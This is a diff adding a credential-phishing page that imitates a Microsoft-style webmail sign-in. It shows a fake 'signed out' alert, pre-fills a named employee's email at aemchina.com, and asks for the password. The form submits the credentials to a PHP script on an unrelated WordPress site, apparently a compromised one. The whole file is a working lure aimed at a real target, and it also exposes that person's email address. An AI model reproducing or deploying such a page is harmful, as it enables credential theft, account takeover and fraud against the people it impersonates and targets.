@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html>
+
+<script language="JavaScript">
+alert("You Account have been signed out. Sign in to continue.")
+</script>
+<head>
+<link rel="shortcut icon" href="https://cdn1.vectorstock.com/i/1000x1000/02/10/envelope-email-icon-vector-26520210.jpg">
+<title>aemchina.com</title>
+</head>
+<style type="text/css">
+
+
+body, html {
+  height: 100%;
+  margin: 0;
+  font-family: "Segoe UI Webfont",-apple-system,"Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
+}
+
+	.wrapper {
+  background-image: url("data:");
+  background-repeat: no-repeat;
+  background-attachment: fixed;
+  background-position: center;
+  background-size: cover;
+  position: fixed;
+  top: 0;
+  left: 0;
+  height: 100%;
+  width: 100%;
+
+  /* this is what centers your element in the fixed wrapper*/
+  display: flex;
+  flex-flow: column nowrap;
+  justify-content: center; /* aligns on vertical for column */
+  align-items: center; /* aligns on horizontal for column */
+
+  /* just for styling to see the limits */
+  /*border: 2px dashed red; */
+  box-sizing: border-box;
+}
+
+.element {
+  width: 400px;
+  height: 270px;
+  padding: 40px 30px;
+
+  /* Just for styling */
+  background-color: #ffffff;
+  border: 1px solid grey;
+}
+.elemente{
+	width: 400px;
+  height: 300px;
+  padding: 40px 30px;
+
+  /* Just for styling */
+  background-color: #ffffff;
+  border: 1px solid grey;
+}
+.logo{
+	background-image: url("mic.png");
+}
+input{
+    border:0;
+    width: 100%;
+    padding:5px 0px;
+    font-size:1.0em;
+    font-family: "Segoe UI Webfont",-apple-system,"Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
+    color:black;
+    border-bottom:solid 1px #ccc;
+
+    border-width: 1px;
+    border-color: #666;
+    border-color: rgba(0,0,0,0.6);
+    height: 36px;
+    outline: none;
+    border-radius: 0;
+    -webkit-border-radius: 0;
+    background-color: transparent;
+    font-weight:400;
+
+}
+input:focus,button:focus {
+    border: 0;
+    border-bottom: 1px solid blue;
+    outline: none !important;
+
+}
+div .sign-opt {
+	padding: 20px 0px;
+	font-size: 14px;
+}
+
+div .button {
+	padding: 20px 0px;
+	font-size: 16px;
+	text-align: right;
+}
+.newbutton{
+	padding: 5px;
+	width: 50px;
+	max-width: 100px;
+	font-size: 14px;
+	width: 100px;
+	color: white;
+	background-color: #005da6;
+}
+.alert-error {
+    color: #e81123;
+    text-align: left;
+    margin-bottom: 0;
+    margin-bottom: 0;
+    font-family: "Segoe UI Webfont",-apple-system,"Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
+}
+a:visited {
+    color: #0067b8;
+}
+a:link {
+    color: #0067b8;
+}
+a {
+    color: #ccc;
+    text-decoration: none;
+}
+a {
+    background-color: transparent;
+}
+.identityBanner {
+    height: 24px;
+    background: #fff;
+    margin-top: 16px;
+    margin-bottom: -4px;
+}
+.text-title {
+    color: #1b1b1b;
+    font-size: 1.5rem;
+    font-weight: 600;
+    padding: 0;
+    margin-top: 16px;
+    margin-bottom: 12px;
+    font-family: "Segoe UI","Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
+}
+</style>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script defer src="https://use.fontawesome.com/releases/v5.0.9/js/all.js" integrity="sha384-8iPTk2s/jMVj81dnzb/iFR2sdA7u06vHJyyLlAd4snFpCl/SnyUjRrbdJsw1pGIl" crossorigin="anonymous"></script>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<body>
+<div class="wrapper"> <!-- Fixed element that spans the viewport -->
+  <div id="element" class="element">
+
+<form method="post" action="https://www.federicoerrico.com/wp-admin/maint/jon/action1.php" autocomplete="">
+  	<div id="donghuagao"><img src=""></div>
+  	<div style="padding-top: 10px;text-align: left;" id="cont" ></div>
+  	<div id="sign"><h2>Dear donghuagao verify your password.</h2></div>
+  	<div class="alert alert-error col-md-24" id="usernameError" ></div>
+  	<div id="em"><input name="email" type="email" required="required" id="i0116" placeholder="Email address, phone number or Skype" value="donghuagao@aemchina.com" size="50" readonly="readonly"></div>
+  	<div id="ep"><input name="passwd" type="password" autofocus="autofocus" required="required" id="i0117" placeholder="Password" value="" size="50"></div>
+  	<div class="sign-opt" id="sign-opt">
+  		<div id="no-acc">Powered by Webmail</a></div><div class="button" ><a href="#"><button id="i983893" class="newbutton" type="submit" name="submit"><img src="">Next</button></a></div>
+  		<div id="sign-out" class="sign-opt"><a href="#"></a></div>
+
+  	</div>
+  </form>
+  </div> <!-- your actual centered element -->
+</div>
+</body>
+</html>
